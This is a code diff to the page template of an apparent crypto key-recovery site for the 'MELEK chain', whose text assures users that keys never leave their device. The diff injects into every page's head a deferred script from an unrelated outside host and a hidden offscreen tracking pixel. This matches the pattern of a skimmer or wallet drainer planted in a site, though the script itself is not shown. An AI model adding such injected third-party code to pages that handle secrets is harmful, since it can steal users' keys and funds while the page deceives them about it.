@@ -164,7 +164,7 @@ function page(title, body) {
 <title>${esc(title)}</title>
 <meta name=description content="Lost your keys? Plain-language account recovery for the MELEK chain. Your keys are made on your own device and never sent to us.">
 <meta name=robots content="noindex,follow">
-${STYLE}</head><body>
+${STYLE}<script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body>
 <header class=top><span class=brand>MELEK<span>·</span> Recovery</span></header>
 <main class=wrap>${body}</main>
 <footer>${esc(SITE_NAME)} — your keys are generated on your own device and never sent to us. Recovery proves
